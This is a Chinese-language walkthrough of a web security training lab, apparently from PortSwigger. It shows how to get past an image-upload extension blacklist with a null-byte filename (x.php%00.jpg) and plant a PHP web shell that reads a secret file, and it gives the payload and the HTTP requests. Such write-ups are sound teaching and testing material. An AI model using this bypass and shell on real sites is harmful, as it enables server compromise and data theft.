# 实验：通过混淆文件扩展名上传 Web Shell

本实验包含一个易受攻击的图片上传功能。某些文件扩展名被列入黑名单，但可以使用经典的混淆技术绕过此防御措施。

为了解决本实验，请上传一个基本的 PHP Web Shell，然后利用它窃取 `/home/carlos/secret` 文件的内容。使用实验室横幅中提供的按钮提交此秘密信息。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 在账户页面发现头像上传功能
- 将 php 代码放入 php 文件 `x.php` 中

    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
- 提交载荷文件
    - 服务器响应
        ```
        Sorry, only JPG & PNG files are allowed
        Sorry, there was an error uploading your file.
        ```
        - 上传被阻止

- 修改文件扩展名
    `x.php.jpg`
    - 访问账户页面，自动请求头像
        ```http
        GET /files/avatars/x.php.jpg HTTP/2
        ```
    - 服务器响应普通的文件文本，而不是作为代码执行
        ```http
        Content-Type: image/jpeg
        <?php echo file_get_contents('/home/carlos/secret'); ?>`
        ```
    - 此处被解析为图像，尝试截断


- 进行一系列扩展名探测
    - `x.jpg.php` php 扩展名在后
        - 被拦截

    - `x.php%00.jpg` 空字节截断
        - `The file avatars/x.php has been uploaded`
            通过扩展名检测的同时被解析为 .php 后缀

- 访问文件端点
    ```http
    GET /files/avatars/x.php HTTP/2
    ```
    - 提取数据的 php 代码成功执行


注意：此处访问账户页面时
- 请求
    ```http
    GET /files/avatars/x.php%00.jpg HTTP/2
    ```
    - 响应
        `404 Not Found`

- 显示了头像名组件与实际文件的组件解析差异
